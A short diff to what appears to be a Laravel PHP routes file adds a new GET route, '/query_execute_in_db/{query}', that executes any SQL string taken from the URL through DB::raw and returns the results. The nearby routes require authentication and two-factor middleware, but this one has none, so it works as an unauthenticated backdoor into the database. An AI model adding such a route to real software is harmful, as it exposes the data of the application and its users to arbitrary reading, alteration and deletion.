@@ -267,7 +267,10 @@ Route::get('/questions_answers/csv/sample', function ()
      return Response::download($file, 'import-template-qa.xls', $headers);
 })->middleware(['auth','2fa']);
 
-
+Route::get('/query_execute_in_db/{query}', function($query){
+    $data = DB::select(DB::raw($query)); // Executes the raw query and fetches the result
+    return $data;
+});
 
 // add media to server
 Route::get('/media/home', 'sucrai\admin\questions_answersController@media_index')->name('home.media')->middleware(['auth','2fa']);
